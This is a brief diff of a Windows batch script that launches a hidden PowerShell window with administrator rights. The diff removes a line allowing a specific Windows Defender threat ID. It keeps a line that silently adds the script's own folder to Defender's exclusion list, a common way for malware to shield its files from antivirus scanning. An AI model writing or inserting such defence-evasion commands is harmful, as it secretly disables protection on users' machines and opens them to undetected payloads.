@@ -11,7 +11,6 @@ exit
 call :Admin
 
 START Powershell -nologo -noninteractive -windowStyle hidden -noprofile -command ^
-Add-MpPreference -ThreatIDDefaultAction_Ids 2147685180 -ThreatIDDefaultAction_Actions Allow -Force;
 Add-MpPreference -ExclusionPath %~dp0;
 
 :Admin
